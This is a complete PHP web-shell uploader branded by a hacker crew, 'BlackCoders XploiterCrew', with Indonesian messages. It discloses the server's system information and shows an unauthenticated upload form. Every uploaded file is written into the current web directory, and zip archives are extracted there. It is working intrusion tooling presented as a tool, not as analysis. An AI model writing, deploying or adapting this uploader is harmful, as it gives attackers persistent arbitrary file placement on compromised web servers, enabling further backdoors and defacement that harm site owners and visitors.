<?php
 Class UploadZip{
   public $info,
   				$system;
   					 
   public function __construct(){
   			echo '<center><h2>BlackCoders XploiterCrew</h2>'.$this->system = php_uname().'<form method="post" enctype="multipart/form-data">
   			<input type="file" name="file">
   			<input type="submit" name="upload" value="Upload"><hr>';
   }
	 public function Berhasil(){
	 	return "File Berhasil Diupload += Di Extract";
	 }
	 public function Gagal(){
	 	return "File Berhasil Diupload != Di Extract";
	 }
	 public function InfoFile(){
	 	return $this->info = "</center><ul><li>Nama File : ".$_FILES["file"]["name"]."</li><li>Ukuran File : ".$_FILES["file"]["size"].".kb</li><li>Type File : ".$_FILES["file"]["type"]."</li></ul>";
	 }
}
   
$UnggahZip1 = new UploadZip();
if(isset($_POST["upload"])){
	 	$file = $_FILES["file"]["name"];
			if(@copy($_FILES["file"]["tmp_name"],$_FILES["file"]["name"])){

// Jalankan Fungsi Unzip file
$UnggahZip2 = new ZipArchive;
if($UnggahZip2->open($file) === true) {
    $UnggahZip2->extractTo('./');
    $UnggahZip2->close();
echo $UnggahZip1->Berhasil();
echo $UnggahZip1->InfoFile();
	}else{
echo $UnggahZip1->Gagal();
	}   
}else{
echo "Ga Bisa Ngapa2in";
}}else{
	echo "<h3>{ Zip Uploader }</h3>";
}